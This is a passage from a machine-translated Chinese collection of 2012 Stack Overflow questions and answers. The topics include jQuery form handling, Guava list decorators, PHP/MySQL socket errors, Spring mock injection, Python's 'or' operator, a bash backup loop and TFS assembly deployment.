    <option value="fv">Frente e verso</option>
</select><br /><br />
Formato <br />
<select name="flf">
    <option value="a6">A6</option>
    <option value="a5">A5</option>

</select><br /><br />
Gramagem <br />
<select name="flg">
    <option value="80">80</option>
    <option value="100">100</option>
</select><br /><br />

</form>

<div id="price1" style="display: none;">10€&lt;/div>
<div id="price2" style="display: none;">20€&lt;/div>
<div id="price3" style="display: none;">30€&lt;/div>
<div id="price4" style="display: none;">40€&lt;/div>
<div id="price5" style="display: none;">50€&lt;/div>
<div id="price6" style="display: none;">60€&lt;/div> 
```

这是我的jQuery代码

```
<script>
$(document).ready(function(){
    $("#encomenda_flyers").change(function(){

        if ($(this).val() == "sf" && $(this).val() == "a6" &&  $(this).val() == "80")   {

            $("#price1").slideDown("slow"); //Slide Down Effect

        } else {

            $("#price1").slideUp("fast");    //Slide Up Effect

        }
});

    });

$(document).ready(function(){
    $("#encomenda_flyers").change(function(){

        if ($(this).val() == "fv" && $(this).val() == "a5" &&  $(this).val() == "100")   {

            $("#price1").slideDown("slow"); //Slide Down Effect

        } else {

            $("#price1").slideUp("fast");    //Slide Up Effect

        }
});

    });

</script> 
```

我需要的是，例如，当同时选择选项值 sf、a6 和 80 显示时，div price1 向下滑动，否则如果选择 a5、sf 和 80，div price 2 向下滑动，等等。

有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:40:30.290

你必须添加你自己的所有`if`语句，但我已经让你的代码在这里工作：http: [//jsfiddle.net/FRR9B/](http://jsfiddle.net/FRR9B/)

那里有两个重要的部分。第一个是`.change`函数的选择器。通过将其更改为，`$("form select")`您将监听表单中任何选择框的更改。

下一个重要的在 if 语句中。`$(this)`在这里不会真正起作用，因为您要在每个选择框中查找值。相反，您需要使用`$('select[name=x]')`每个选择框名称替换 x。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T23:43:17.433

**HTML**

```
Selecção de produtos <br />
<form name="encomendaflyers">
    <select id="flp" name="flp">
        <option value="sf">Só Frente</option>
        <option value="fv">Frente e verso</option>
    </select>
    <br />
    <br />
    Formato <br />
    <select id="flf" name="flf">
        <option value="a6">A6</option>
        <option value="a5">A5</option>
    </select>
    <br />
    <br />
    Gramagem <br />
    <select id="flg" name="flg">
        <option value="80">80</option>
        <option value="100">100</option>
    </select>
    <br />
    <br />
</form>
<div id="price1" class="hiddenPrice" style="display: none;">10€&lt;/div>
<div id="price2" class="hiddenPrice" style="display: none;">20€&lt;/div>
<div id="price3" class="hiddenPrice" style="display: none;">30€&lt;/div>
<div id="price4" class="hiddenPrice" style="display: none;">40€&lt;/div>
<div id="price5" class="hiddenPrice" style="display: none;">50€&lt;/div>
<div id="price6" class="hiddenPrice" style="display: none;">60€&lt;/div>
​ 
```

**Javascript**

```
$(document).ready(function() {
    $("#flp, #flf, #flg").on('change', function() {

        if ($('#flp').val() === "sf" && $('#flf').val() === "a6" && $('#flg').val() === "80") {
            $('.hiddenPrice').slideUp();
            $("#price1").slideDown("slow"); 
        } else if ($('#flp').val() === "fv" && $('#flf').val() === "a5" && $('#flg').val() === "100") {
            $('.hiddenPrice').slideUp();
            $("#price2").slideDown("slow"); 
        } else {
            $('.hiddenPrice').slideUp();
        }
    }).trigger('change');
});​ 
```

**[演示](http://jsfiddle.net/KMjmW/1/)**

# java - 使用 Guava ForwardingList 装饰集合的意外行为

> ID：13870358
> 
> 赞同：0
> 
> 时间：2012-12-13T23:26:31.420
> 
> 标签：java, collections, decorator, guava, generic-collections

我遇到了一个非常讨厌的我会说'副作用'，但这显然是一个糟糕的设计问题。我正在使用 Guava [ForwardingList](http://docs.guava-libraries.googlecode.com/git-history/v13.0.1/javadoc/com/google/common/collect/ForwardingList.html)模式来装饰常规列表。我的目的是建立一个大小限制列表，其中最旧的元素在满足 maximumSize 时被踢出（一个简单的 FIFO 设计）。请注意，我不会代理或克隆我现有的收藏。但我有这个非常讨厌的副作用：

```
List<String> originalList = new ArrayList<String>();
int maximumSize = 2;

originalList.add("foo");
originalList.add("bar");

System.out.println(originalList); // [foo, bar]

ListFactory<String> factory = ListFactory.getInstance(String.class);
List<String> decoratedList = factory.newTalendList(originalList, maximumSize);

decoratedList.add("beer");
System.out.println(originalList); // [bar, beer]

originalList.add("ben");
System.out.println(originalList); // [bar, beer, ben] <-- !!!
System.out.println(decoratedList); // [bar, beer, ben] <-- !!! 
```

（注意：我的装饰类覆盖 add() 以在添加新元素时删除列表的第一个元素。所有其他非覆盖方法，包括 toString()，都委托给原始列表）

好的，您可能会看到，如果我使用原始的 add() 方法添加元素，我可能会超过最大尺寸...好吧，我想这是不可避免的（毕竟这在设计上并没有错）。但这对于 decoratedList 的设计并非如此。

我发现的唯一解决方法是：

```
List<String> decoratedList = factory.newTalendList(new ArrayList<String>(originalList), maximumSize); 
```

但这似乎不是最好的方法（我不确定它是否适用于所有情况）：我不是在*装饰*originalList，而是她的匿名克隆！我想知道：也许我完全搞砸了我的设计？有没有更好的方法来构建它？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-13T23:38:17.717

这种模式起作用的唯一方法是`originalList`在创建装饰器后不再引用。`ForwardingList`不可能`originalList`控制. （没有装饰器可以。）

总的来说，您可能应该*做*的是创建一个工厂方法，该方法返回一个全新的装饰列表，并且根本不允许您访问原始列表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T23:39:32.480

您尝试做的事情非常奇怪。原始列表对被约束一无所知，约束列表也认为他是唯一使用原始列表的人。因此，请不要以可能会弄乱其装饰版本的方式使用原始列表。

# php - PHP - MYSQL - 测试数据库服务器

> ID：13870362
> 
> 赞同：5
> 
> 时间：2012-12-13T23:26:35.100
> 
> 标签：php, mysql

我正在学习 PHP MYSQL 并尝试创建一个数据库。

我正在关注本教程 [http://www.raywenderlich.com/2941/how-to-write-a-simple-phpmysql-web-service-for-an-ios-app](http://www.raywenderlich.com/2941/how-to-write-a-simple-phpmysql-web-service-for-an-ios-app)

到目前为止，我正在测试服务器是否可以访问 MySQL。当我使用以下代码时。

```
?php

class RedeemAPI {
   private $db;

   // Constructor - open DB connection
   function __construct() {
       $this->db = new mysqli('localhost', 'username', 'password', 'promos');
    $this->db->autocommit(FALSE);
}

// Destructor - close DB connection
function __destruct() {
    $this->db->close();
}

// Main method to redeem a code
function redeem() {
    // Print all codes in database
    $stmt = $this->db->prepare('SELECT id, code, unlock_code, uses_remaining FROM rw_promo_code');
    $stmt->execute();
    $stmt->bind_result($id, $code, $unlock_code, $uses_remaining);
    while ($stmt->fetch()) {
        echo "$code has $uses_remaining uses remaining!";
    }
    $stmt->close();
   }
} 
// This is the first thing that gets called when this page is loaded
// Creates a new instance of the RedeemAPI class and calls the redeem method
$api = new RedeemAPI;
$api->redeem();

? 
```

我收到以下错误：

```
Warning: mysqli::mysqli() [mysqli.mysqli]: [2002] No such file or directory (trying to connect via unix:///var/mysql/mysql.sock) in /Users/user/Sites/promos/index.php on line 8

Warning: mysqli::mysqli() [mysqli.mysqli]: (HY000/2002): No such file or directory in /Users/user/Sites/promos/index.php on line 8

Warning: mysqli::autocommit() [mysqli.autocommit]: Couldn't fetch mysqli in /Users/user/Sites/promos/index.php on line 9

Warning: mysqli::prepare() [mysqli.prepare]: Couldn't fetch mysqli in /Users/user/Sites/promos/index.php on line 20

Fatal error: Call to a member function execute() on a non-object in /Users/user/Sites/promos/index.php on line 21 
```

我可能忘记启用某些东西了吗？

它可以解释为什么我无法通过我的 IP 地址连接到 sequel pro 并且只能连接到 127.0.0.1？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-11-09T22:40:47.403

Apache 服务器使用 '127.0.0.1' 而不是 'localhost'

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-12-14T01:17:44.030

您必须检查两个设置才能使其正常工作（当然假设您安装了 MySQL 服务器）：

检查[`mysql.default_socket`](http://php.net/manual/en/mysql.configuration.php#ini.mysql.default-socket)PHP 配置中的值。

检查[`socket`](http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_socket)MySQL 配置文件中`[mysqld]`标题下的值。

这些值必须相同；如果不是，请更改一个以匹配另一个并重新启动相应的服务。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-14T01:26:41.917

这似乎是一个常见的问题，因为谷歌搜索它会产生相当多的结果。我在我的两个 linux 机器上也遇到过这种情况（虽然从来没有在 Windows 下），并且在某些时候我决定在所有开发服务器上只使用 127.0.0.1。基本上， localhost 使与 MySQL 服务器的连接使用套接字，但您的配置没有正确指向套接字文件。

以下是一些您可能会觉得有用的资源：

[http://westsworld.dk/blog/2011/03/problems-connecting-to-unixvarmysqlmysql-sock/](http://westsworld.dk/blog/2011/03/problems-connecting-to-unixvarmysqlmysql-sock/) - 基本上是@Jack 的建议，但更深入

[无法在 Mac 上连接到 MySQL - 缺少 mysql.sock 文件](https://stackoverflow.com/questions/5784791/cant-connect-to-mysql-on-mac-missing-mysql-sock-file)- 以下是如何定位您的套接字文件（由于某种原因，我的 php.ini 路径错误，我假设您的情况可能类似）。

我希望这有帮助。

# networking - 唯一识别机器：是否需要每台机器有一个主机名

> ID：13870366
> 
> 赞同：0
> 
> 时间：2012-12-13T23:26:40.263
> 
> 标签：networking, network-programming

我需要唯一标识一台机器，尽管它有多个 IP 地址（*这是 linux 机器的常见场景*）我正在考虑使用主机名作为机器/系统的标识符（主机名 in `/etc/hostname`）。一个系统必须只有一个`hostname`主机名还是一个系统可以有多个主机名。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:31:38.860

我会将其识别为主机名、MAC 地址、处理器序列号和硬件序列号的某种组合。这对于虚拟化来说可能是不可能的，尽管虚拟机*应该*有一个唯一的 MAC，除非有人复制了它。

另外，我会使用 uname -n 获取主机名，而不是解析 /etc/hostname。并非所有 Unix (HP-UX) 都使用 /etc/hostname，因此这增加了可移植性。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-13T23:35:55.637

fe 您的主机连接到网络 192.168.1.12 和 10.0.1.14

编辑您的/ **etc/hosts**

**192.168.1.12 ethhost**

**10.0.1.14 wlanhost**

现在您将能够使用名称 ethhost 和 wlanhost ping 您的主机

# spring - 如何将模拟注入标记为“@Transactional”的 Spring 类？

> ID：13870371
> 
> 赞同：1
> 
> 时间：2012-12-13T23:27:09.593
> 
> 标签：spring, dependency-injection, junit, mocking, transactional

我正在使用 Spring 3.1.1.RELEASE 和 JUnit 4.8.1。在我的测试课上，我想模拟一个私有字段并发现“ReflectionTestUtils”的美妙之处......

```
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration({ "classpath:test-context.xml" })
public class OrderServiceTest extends AbstractTransactionalJUnit4SpringContextTests
    …
        @Autowired
    private OrderService m_orderSvc;

    @Test
    public void testGetPDOrders() throws QuickBaseException, Exception {
        …
            ReflectionTestUtils.setField(m_orderSvc, "m_orderDao", mockOrderDao); 
```

下面是我试图模拟的类和领域......

```
@Service("orderService")
@Transactional
public class OrderServiceImpl implements OrderService {

    …
    @Autowired
    private OrderDAO m_orderDao; 
```

令人失望的是，我收到以下错误。我读过这是因为我的类被标记为“@Transactional”，但我找不到足够的解决方法，而且仅仅为了适应 JUnit 而编写 setter 方法似乎是一种浪费。有人对我如何将模拟对象注入私有字段有其他建议吗？

```
java.lang.IllegalArgumentException: Could not find field [m_orderDao] on target [org.mainco.subco.myclient.service.OrderServiceImpl@282f0e07]
    at org.springframework.util.Assert.notNull(Assert.java:112)
    at org.springframework.test.util.ReflectionTestUtils.setField(ReflectionTestUtils.java:107)
    at org.springframework.test.util.ReflectionTestUtils.setField(ReflectionTestUtils.java:84)
    at org.mainco.subco.myclient.service.OrderServiceTest.testGetPDOrders(OrderServiceTest.java:130)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:44)
    at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:15)
    at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:41)
    at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:20)
    at org.springframework.test.context.junit4.statements.RunBeforeTestMethodCallbacks.evaluate(RunBeforeTestMethodCallbacks.java:74)
    at org.springframework.test.context.junit4.statements.RunAfterTestMethodCallbacks.evaluate(RunAfterTestMethodCallbacks.java:83)
    at org.springframework.test.context.junit4.statements.SpringRepeat.evaluate(SpringRepeat.java:72)
    at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:231)
    at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:49)
    at org.junit.runners.ParentRunner$3.run(ParentRunner.java:193)
    at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:52)
    at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:191)
    at org.junit.runners.ParentRunner.access$000(ParentRunner.java:42)
    at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:184)
    at org.springframework.test.context.junit4.statements.RunBeforeTestClassCallbacks.evaluate(RunBeforeTestClassCallbacks.java:61)
    at org.springframework.test.context.junit4.statements.RunAfterTestClassCallbacks.evaluate(RunAfterTestClassCallbacks.java:71)
    at org.junit.runners.ParentRunner.run(ParentRunner.java:236)
    at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.run(SpringJUnit4ClassRunner.java:174)
    at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:50)
    at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:467)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:683)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:390)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:197) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:50:13.220

我不确定您使用的是什么模拟库，但是 Spring 和 Mockito 之间有一个有用的集成，恰当而笨拙地命名为“ [Springockito](https://bitbucket.org/kubek2k/springockito/wiki/Home) ”，它可以在更大的 Spring 上下文中非常容易地进行模拟的战术插入。

这个想法是您更改测试应用程序上下文以将该 bean 映射到模拟，而不是尝试在运行时将模拟连接到您的父 bean。

所以实际上你最终会得到：

**文本上下文.xml**

```
<beans xmlns="http://www.springframework.org/schema/beans"
      ...
      xmlns:mockito="http://www.mockito.org/spring/mockito"
      xsi:schemaLocation="... http://www.mockito.org/spring/mockito https://bitbucket.org/kubek2k/springockito/raw/tip/springockito/src/main/resources/spring/mockito.xsd">

    <mockito:mock id="m_orderDao" class="my.package.OrderDao"/>

    <!--... other config ...-->
 </beans> 
```

然后，如果您需要与其交互，您可以将模拟本身自动连接到您的测试中，就像您现在为您的服务所做的那样。

如果您**不**使用 Mockito，您仍然可以使用上述方法，而是使用您的模拟库的方法来创建模拟作为 bean 的工厂。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-09-16T08:23:52.160

截至 2014 年，最简单的解决方案是使用 @InjectMocks 注释，它是 Mockito 的一部分。这适用于任何类，包括标有@Transactional 的类。

这是一个例子：

```
public class TestTestController {

    @Mock
    private TestService testService;

    @InjectMocks
    private TestController testController;

    @Before
    public void initMocks() {
        MockitoAnnotations.initMocks(this);
    }

    @Test
    public void testMocks() throws Exception {
        String mockedReturnValue = "this is a mocked reply";
        when(testService.getMessage()).thenReturn(mockedReturnValue);

        assertEquals(mockedReturnValue, testController.callTestService());

    }
} 
```

和相关的类

```
public class TestController {

    @Autowired
    private TestService testService;

    public String callTestService() {
        return testService.getMessage();
    }

}

public class TestService {

    public static final String THIS_IS_A_TEST = "this is a getMessage";

    public String getMessage() {
        return THIS_IS_A_TEST;
    }

} 
```

# python - “或”运算符不返回布尔值的动机是什么？

> ID：13870378
> 
> 赞同：6
> 
> 时间：2012-12-13T23:28:16.053
> 
> 标签：python, operators, boolean

首先，代码：

```
>>> False or 'hello'
'hello' 
```

这种令人惊讶的行为使您可以检查是否`x`不是`None`并检查`x`一行中的值：

```
>>> x = 10 if randint(0,2) == 1 else None
>>> (x or 0) > 0
# depend on x value... 
```

说明：[这样](http://docs.python.org/2/library/stdtypes.html)`or`的功能：

> 如果 x 为假，则为 y，否则为 x

我知道的任何语言都不允许您这样做。那么，为什么要 Python 呢？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-13T23:52:53.027

听起来您将两个问题合二为一。

首先是短路问题。Marcin 的回答完美地解决了这个问题，所以我不会尝试做得更好。

其次，存在`or`并`and`返回最后评估的值，而不是将其转换为布尔值。两种方式都有争论，您可以在分歧的任何一方找到许多语言。

返回最后评估的值允许使用`functionCall(x) or defaultValue`快捷方式，避免可能浪费的转换（如果您要做的唯一事情是检查它是否非零，为什么要将其转换`int` `2`为 a ？），并且通常更容易解释。`bool` `1`因此，由于这些原因的各种组合，C、Lisp、Javascript、Lua、Perl、Ruby 和 VB 等语言都以这种方式做事，Python 也是如此。

始终从运算符返回布尔值有助于捕获一些错误（尤其是在逻辑运算符和位运算符容易混淆的语言中），并且它允许您设计一种语言，其中布尔检查是严格类型检查`true`而不是只检查非零，它使运算符的类型更容易写出，并且避免了在两个操作数是不同类型的情况下处理转换（参见`?:`C 系列语言中的运算符）。因此，由于这些原因的各种组合，C++、Fortran、Smalltalk 和 Haskell 等语言都以这种方式做事。

* * *

在您的问题中（如果我理解正确的话），您正在使用此功能来编写如下内容：

```
if (x or 0) < 1: 
```

什么时候`x`可以轻松`None`。这个特殊的用例不是很有用，既因为更明确的`x if x else 0`（在 Python 2.5 和更高版本中）同样容易编写并且可能更容易理解（至少 Guido 是这么认为的），而且因为无论如何`None < 1`都是一样的`0 < 1`（至少在 Python 2.x 中，所以你总是至少有两个选项中的一个）……但也有类似的例子，它*很有*用。比较这两个：

```
return launchMissiles() or -1

return launchMissiles() if launchMissiles() else -1 
```

第二个将浪费大量导弹在南极洲炸毁你的敌人两次而不是一次。

* * *

如果你好奇为什么 Python 会这样做：

回到 1.x 时代，*没有*类型`bool`。你有虚假的价值，比如`None`, `0`, `[]`, `()`,`""`等等，其他的都是真的，那么谁需要明确`False`的 and`True`呢？返回`1`from`or`会很愚蠢，因为`1`它不比`[1, 2, 3]`or更真实`"dsfsdf"`。到`bool`添加的时候（逐渐超过两个 2.x 版本，IIRC），当前的逻辑已经牢固地嵌入到语言中，并且更改会破坏很多代码。

那么，他们为什么不在 3.0 中更改它呢？许多 Python 用户，包括 BDFL Guido，建议您不要`or`在这种情况下使用（至少因为它违反了“TOOWTDI”）；您应该将表达式的结果存储在变量中，例如：

```
missiles = launchMissiles()
return missiles if missiles else -1 
```

事实上，Guido 已经表示他想禁止`launchMissiles() or -1`，这也是他最终接受他之前多次拒绝的三元表达式`if`的部分原因。`else`但许多其他人不同意，Guido 是一个 *仁慈*的DFL。此外，`or`按照您在其他地方所期望的方式工作，同时在这里拒绝做您想做的事（但 Guido 不希望您做），实际上会非常复杂。

* * *

因此，在这里，Python 可能总是与 C、Perl 和 Lisp 站在同一边，而不是与 Java、Smalltalk 和 Haskell 站在同一边。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-12-13T23:33:05.993

> 没有我知道的语言可以让你这样做。那么，为什么 Python 会这样做呢？

那么你不会很多语言。我想不出我知道的一种语言不会表现出这种“短路”行为。

这样做是因为这样说很有用：

```
a = b or K 
```

这样 a 要么变成 b，如果 b 不是 None （或否则是假的），如果不是，它得到默认值 K。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-12-13T23:31:43.353

实际上，许多语言都可以。参见关于[短路评估的维基百科](http://en.wikipedia.org/wiki/Short-circuit_evaluation)

出于短路评估存在的原因，维基百科写道***：***

> 如果用作条件的两个表达式都是简单的布尔变量，则实际上一次计算布尔运算中使用的两个条件会更快，因为它总是需要一个计算周期，而不是短路计算中使用的一个或两个周期（取决于第一个的值）。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2014-06-06T12:48:50.497

这种行为并不奇怪，如果您认为 Python 具有以下关于**or**和**and** **not**逻辑运算符的特性，那就很简单了：

*   **短路评估**：它只评估操作数到它需要的地方。
*   **非强制结果**：结果是操作数之一，不强制为`bool`.

而且，另外：

*   对象的**真值**仅对, , , , ,为***False***。其他所有内容的真值均为***True***（*这是一种简化；正确的定义在**[官方文档](https://docs.python.org/2/library/stdtypes.html#truth-value-testing)*中）`None``False``0``""``[]``{}`

 *结合这些特征，它会导致：

*   **or**：如果第**一个**操作数的计算结果为***True***，则在此处短路并返回它。或返回第二个操作数。
*   **and**：如果第**一个**操作数的计算结果为***False***，则在此处短路并返回它。或返回第二个操作数。

如果您概括为一系列操作，则更容易理解：

```
>>> a or b or c or d

>>> a and b and c and d 
```

这是我记住的“经验法则”，可帮助我轻松预测结果：

*   **or**：返回它找到的*第一个“ **truthy** ”*操作数，或者最后一个。
*   **and** : 返回它找到的*第一个“ **falsy** ”*操作数，或者最后一个。

至于你的问题，***为什么***python 会有这样的行为，嗯......我认为因为它有一些非常简洁的用途，而且理解起来非常直观。一个常见的用途是一系列后备选择，使用第一个“找到”（即*非虚假*）。想想这个愚蠢的例子：

```
drink = getColdBeer() or pickNiceWine() or random.anySoda or "meh, water :/" 
```

或者这个真实世界的场景：

```
username = cmdlineargs.username or configFile['username'] or DEFAULT_USERNAME 
```

这比替代方案更简洁*和*优雅。

正如许多其他答案所指出的那样，Python 并不孤单，许多其他语言具有相同的行为，无论是短路（我相信*大多数*当前语言都是）和非强制。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-13T23:46:04.373

“没有我知道的语言可以让你这样做。那么，为什么 Python 会这样做呢？” 您似乎认为所有语言都应该相同。您不期望编程语言的创新能够产生人们重视的独特功能吗？

您刚刚指出了它为什么有用，那么 Python 为什么不这样做呢？也许你应该问为什么其他语言没有。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-02-02T22:20:16.907

您可以在布尔上下文之外利用 Python 或运算符的特殊功能。经验法则仍然是布尔表达式的结果是第一个`true`操作数或行中的最后一个操作数。

请注意，逻辑运算符（或包含的）在赋值运算符之前计算`=`，因此您可以将布尔表达式的结果分配给变量，就像使用普通表达式一样：

```
>>> a = 1
>>> b = 2
>>> var1 = a or b
>>> var1
1
>>> a = None
>>> b = 2
>>> var2 = a or b
>>> var2
2
>>> a = []
>>> b = {}
>>> var3 = a or b
>>> var3
{} 
```

在这里，`or`运算符按预期工作，返回第一个`true`操作数或最后一个操作数，如果两者都被评估为`false`。*

# php - 用数据库中的对象属性填充 Javascript 数组

> ID：13870381
> 
> 赞同：0
> 
> 时间：2012-12-13T23:28:22.810
> 
> 标签：php, javascript, arrays

您好我正在尝试在 javascript 中创建一个数组“事件”，其中填充了两个属性 {Title: , Date:} 的对象

但是，这两个属性的值是使用 PHP 从数据库中获取的！

这是我的代码，但我不知道为什么它不起作用..

```
var events = [ 
    <?php 

//Connect to mysql server
//Select database

    $result=mysql_query("SELECT * FROM event");
    $count = mysql_num_rows($result);
    if($count>0){
    for($i=0;$i<$count-1;$i++){
    $row= mysql_fetch_row($result);

    echo "{ Title: ".$row['title'].", Date: ".$row['date']." },";
        }

    $row= mysql_fetch_row($result);
    echo "{ Title: ".$row['title'].", Date: ".$row['date']." }";

    }
    ?>]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:39:15.660

让我们首先构建您的结果：

使用 array_push 从 SQL 创建数据（这称为[关联数组](http://php.net/manual/en/language.types.array.php)：

```
var events = 
<?php 
  $json = array();
  $result=mysql_query("SELECT * FROM event");
  $count = mysql_num_rows($result);
  for($i=0;$i<$count;$i++) {
    $row= mysql_fetch_row($result);
    $item = array();
    $item['Title'] = $row['title'];
    $item['Date'] = $row['date'];
    $json[] = $item;
  } 
```

[现在使用json_encode](http://php.net/manual/en/function.json-encode.php)将结果回显为 JSON ：

```
 echo json_encode($json);
?>; 
```

在 PHP 5.3.2 中测试

# bash - 终端 Minecraft 服务器自动保存脚本

> ID：13870382
> 
> 赞同：2
> 
> 时间：2012-12-13T23:28:26.977
> 
> 标签：bash

这是一个关于 Minecraft 终端脚本的后续问题，该脚本将启动具有 1 GB 内存的服务器，并立即开始一个 30 分钟的循环，该循环将频繁备份服务器地图。

这是我目前正在使用的代码：

```
cd /Users/userme/Desktop/Minecraft
java -Xmx1024M -Xms1024M -jar minecraft_server.jar & bash -c 'while [ 0 ]; do cp -r /Users/userme/Desktop/Minecraft/world /Users/userme/Desktop/A ;sleep 1800;done' 
```

现在很明显，这个循环会将备份保存在名为“world”的目录“A”中。是否可以对此代码进行修改，以便它基本上计算脚本进行的循环数量，然后将该计数应用于备份的末尾。例如`world5`， 或`world 12`。可以摆脱旧备份的修改也很好。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:32:38.283

为了更好的可读性，我将其分解为单独的行：

如果你想把它全部放回一行，你可以`;`在适当的地方添加后面

```
counter=1
while [ 0 ] 
do 
    if [ -e /Users/userme/Desktop/A/world"$counter" ]; then
        rm -f /Users/userme/Desktop/A/world"$counter"
    fi
    counter=$((counter+1))
    cp -r /Users/userme/Desktop/Minecraft/world /Users/userme/Desktop/A/world"$counter" 
    sleep 1800
done 
```

# list - Flash Builder 4.6 scrollToIndex 不适合我

> ID：13870385
> 
> 赞同：0
> 
> 时间：2012-12-13T23:28:34.900
> 
> 标签：list, flash-builder

我需要能够选择一个索引并使其可见。我可以选择要选择的索引，但无法滚动...

```
 for (var _index:int=0; _index < registrarsAll.length; _index++) {
        registrarsList.addItemAt(registrarsAll[_index].name, registrarsList.length);
        registrarsIDs.addItemAt(registrarsAll[_index].id, registrarsIDs.length)

        if(registrarsAll[_index].id == judgeID) {
            judgesLB.selectedIndex = registrarsIDs.length-1;    
        }   
    }

    judgesLB.scrollToIndex(judgesLB.selectedIndex); 
```

索引被选中，但我无法让它滚动到视图中。我在creationComplete上调用它。registrarsList是名单judgesLB的数据源。

谢谢你的帮助。

约翰

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T23:24:12.123

我能够让它在 JudgesLB 列表的 updateComplete 事件中工作......

```
updateComplete = "{((judgesLB.selectedIndex>13)?judgesLB.scrollToIndex(judgesLB.selectedIndex):null)}" 
```

selectedIndex 不能为负数。-1 将产生错误。

# c# - 使用 Team Foundation Server DLL 作为类库中的参考

> ID：13870389
> 
> 赞同：5
> 
> 时间：2012-12-13T23:28:55.947
> 
> 标签：c#, asp.net, .net, service, tfs

我创建了一个 Windows 服务来与 TFS 服务器交互，它在我的本地机器上运行良好。为了完成这项工作，我必须添加对 Microsoft.TeamFoundation.Client.dll 的引用 - 我从本地计算机上的 TFS 安装中复制了这个文件，然后将其添加到一个文件夹中，然后添加了对来自的 dll 的引用我的项目。

现在我需要在服务器上进行部署，我认为将服务器上的 dll 复制到与 .exe 相同的级别就足够了。但它一直在说`Could not load file or assembly 'Microsoft.TeamFoundation.Client`

我需要在这里做什么？

**编辑：**好的，所以我发现 microsoft dll 是 32 位的，而服务器是 64 位的。我也将服务目标更改为 32 位，但我仍然遇到同样的问题...

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-14T00:51:41.530

Team Foundation Server 对象模型（客户端程序集）安装在 GAC 中（连同它的其他依赖项）。它们作为 Visual Studio 和团队资源管理器 SKU 的一部分分发，这是将它们作为 redist 使用的受支持方式。

最近，对象模型也作为单独的安装程序提供：

[http://visualstudiogallery.msdn.microsoft.com/a37e19fb-3052-4fc9-bef7-4a4682069a75](http://visualstudiogallery.msdn.microsoft.com/a37e19fb-3052-4fc9-bef7-4a4682069a75)

这是针对 2010 年 OM 的。我相信 2012 OM 安装程序正在开发中。

这是一个相关链接：

[http://blogs.msdn.com/b/buckh/archive/2012/07/14/standalone-installer-for-the-tfs-client-object-model.aspx](http://blogs.msdn.com/b/buckh/archive/2012/07/14/standalone-installer-for-the-tfs-client-object-model.aspx)

如果您必须拥有 2012 OM 才能将其作为单独的 sku 发布，解决方法是使用此处提供的团队资源管理器 sku：

[http://www.microsoft.com/en-us/download/details.aspx?id=30656](http://www.microsoft.com/en-us/download/details.aspx?id=30656)

更新：2012 OM redist 在这里：http: [//visualstudiogallery.msdn.microsoft.com/f30e5cc7-036e-449c-a541-d522299445aa](http://visualstudiogallery.msdn.microsoft.com/f30e5cc7-036e-449c-a541-d522299445aa)

更新：2015 年，OM 不再在 GAC 中。移动到一个 nuget 包来消费。

# oracle - 如何使用 Enterprise Architect 和 Oracle 数据库创建数据库图？

> ID：13870393
> 
> 赞同：3
> 
> 时间：2012-12-13T23:29:49.210
> 
> 标签：oracle, enterprise-architect, oracle-sqldeveloper, database-diagramming, database-diagram

我需要在 Enterprise Architect 中创建一个数据库图。

我了解如何创建每个表并手动添加列。但这需要我很长时间。

数据库是 Oracle 11g，我使用 Oracle SQL Developer。

有没有办法将数据库模式导出/导入到 Enterprise Architect 中？我不知道如何创建与我的数据库的连接。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T01:03:11.950

您需要与数据库建立 ODBC 连接。然后您可以在项目浏览器中选择一个包，右键单击 > 代码工程 > 从 ODBC 导入 DB 模式...

# c++ - 递归算法的实现

> ID：13870394
> 
> 赞同：3
> 
> 时间：2012-12-13T23:29:57.137
> 
